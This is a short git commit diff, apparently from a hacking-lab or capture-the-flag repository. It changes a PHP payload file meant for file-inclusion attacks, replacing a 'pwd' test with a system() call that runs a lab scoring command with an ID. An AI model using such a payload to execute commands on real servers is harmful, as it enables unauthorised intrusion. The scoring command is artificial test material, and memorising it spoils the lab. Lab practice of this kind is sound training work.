ad4b08cdf341e71de76fbdc1fc9395b2fb1ba0dd
Sami Spets <34544461+spetssami@users.noreply.github.com>
2022-12-27 10:59:13 +0200

    Update fileInclusion.php

--- payloads/fileInclusion.php
+++ payloads/fileInclusion.php
@@ -1,11 +1,4 @@
 <?php
-echo '<pre>';
 
-$last_line = system('pwd', $retval);
-// /usr/local/bin/score df656628-bef4-410b-9796-68228130dcd1
-// Printing additional info
-echo '
-</pre>
-<hr />Last line of the output: ' . $last_line . '
-<hr />Return value: ' . $retval;
+$last_line = system('/usr/local/bin/score df656628-bef4-410b-9796-68228130dcd1', $retval);
 ?>
